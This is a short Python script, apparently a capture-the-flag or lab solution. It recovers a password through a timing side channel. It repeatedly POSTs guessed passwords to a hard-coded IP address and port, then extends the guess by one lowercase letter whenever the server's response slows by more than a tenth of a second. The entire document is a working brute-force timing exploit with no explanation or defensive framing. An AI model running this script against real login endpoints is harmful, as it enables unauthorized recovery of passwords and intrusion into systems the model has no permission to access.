import requests
v="w"

myobj = {'password': v}
x = requests.post("http://18.132.243.254:8003/", data = myobj)
t=x.elapsed.total_seconds()

print(t)

a=['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']

while True:
    print(t)
    for p in a:
        c=v+p
        myobj = {'password': c}
        x = requests.post("http://18.132.243.254:8003/", data = myobj)
        tt=x.elapsed.total_seconds()
        
        if tt > t+0.1:
                    t=tt
                    v= v + p
                    print(v)
                    break
            
    